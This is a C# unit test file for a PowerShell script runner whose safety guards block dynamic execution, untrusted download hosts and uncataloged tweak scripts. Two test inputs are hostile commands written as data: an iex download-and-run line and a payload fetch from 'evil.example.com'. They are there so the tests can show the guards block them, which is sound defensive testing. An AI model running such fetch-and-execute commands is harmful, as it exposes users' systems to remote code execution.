using Phantom.Models;
using Phantom.Services;

namespace Phantom.Tests;

public sealed class PowerShellRunnerTests
{
    [Fact]
    public async Task ExecuteAsync_BlocksDynamicScriptExecution_WhenSafetyGuardsEnabled()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.dynamic",
            StepName = "apply",
            Script = "iex ((New-Object Net.WebClient).DownloadString('https://example.com/install.ps1'))",
            DryRun = false
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Blocked dynamic script execution pattern", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUntrustedDownloadHost_WhenSafetyGuardsEnabled()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.host",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://evil.example.com/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
            DryRun = false
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Blocked download host", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsTrustedHost_WhenDryRun()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.trusted",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile \"$env:TEMP\\AppInstaller.msixbundle\"",
            DryRun = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUncatalogedTweakScript_WhenCatalogAllowlistEnabled()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "tweak.test.unsafescript",
            StepName = "apply",
            Script = "Write-Output 'hello from untrusted tweak script'",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("trusted catalog allowlist", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_FailsRunspaceStep_WhenWingetReportsNoPackageFound()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "store.app.firefox",
            StepName = "install",
            Script = "$ErrorActionPreference='Continue'; Write-Error 'No package found matching input criteria.'; $null = 'winget install --id Mozilla.Firefox';",
            DryRun = false,
            SkipSafetyBackup = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.NotEqual(0, result.ExitCode);
        Assert.Contains("No package found matching input criteria.", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsNonTerminatingRunspaceError_WhenNoWingetFailureMarkerPresent()
    {
        var settings = new AppSettings
        {
            EnforceScriptSafetyGuards = true
        };

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "store.app.firefox",
            StepName = "install",
            Script = "$ErrorActionPreference='Continue'; Write-Error 'simulated non-terminating warning'; $null = 'winget install --id Mozilla.Firefox';",
            DryRun = false,
            SkipSafetyBackup = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
        Assert.Contains("simulated non-terminating warning", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }
}
